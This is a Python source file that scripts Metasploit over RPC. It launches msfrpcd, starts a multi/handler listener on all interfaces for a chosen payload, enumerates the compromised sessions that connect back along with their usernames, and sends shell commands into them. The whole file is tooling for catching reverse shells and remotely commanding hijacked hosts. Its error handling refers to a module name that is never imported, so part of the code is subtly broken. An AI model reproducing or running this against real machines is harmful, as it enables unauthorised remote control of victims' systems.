import time
import httplib
import subprocess
from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole

class MetasploitInteractor():
	def __init__(self, password, rpcport, listenerport, payload):
		self.interactorclient = MsfRpcClient(password, ssl=False, port=rpcport)

		self.consolebuffer = []
		self.listenerconsole = MsfRpcConsole(self.interactorclient, cb=self.appendtoconsolebuffer)

		self.listenerconsole.execute('use exploit/multi/handler')
		self.listenerconsole.execute('set PAYLOAD ' + payload)
		self.listenerconsole.execute('set LPORT ' + str(listenerport))
		self.listenerconsole.execute('set LHOST 0.0.0.0')
		self.listenerconsole.execute('set ExitOnSession false')
		self.listenerconsole.execute('exploit -j')

		self.currentsessionid = None
		self.currentshell = None

	def writetoconsole(self, data):
		self.listenerconsole.execute(data)

	def appendtoconsolebuffer(self, consoledata):
		self.consolebuffer.append(consoledata)

	def readconsole(self):
		unread = self.consolebuffer
		self.consolebuffer = []
		return unread

	def getsessions(self, verbose=False):
		if verbose:
			return self.interactorclient.sessions.list.items()
		else:
			return [ [sessionid,sessionmeta['info'],sessionmeta['username']] for sessionid, sessionmeta in self.interactorclient.sessions.list.items()]

	def sendcommandtosession(self, sessionid, command):

		if sessionid != self.currentsessionid:
			try:
				self.currentshell = self.interactorclient.sessions.session(sessionid)
			except KeyError:
				return "Error, session does not exist"
			self.currentsessionid = sessionid

		try:
			self.currentshell.write(command)
			resp = self.currentshell.read()

		except (metasploit.msfrpc.MsfRpcError, httplib.CannotSendRequest):
			return "Error, session died"
		
		return resp

def StartMsfrpcd(password):
	processes = []
	processes.append(subprocess.Popen(['msfrpcd', '-P', password, '-S', '-n', '-f', '-a', '127.0.0.1']))
	return processes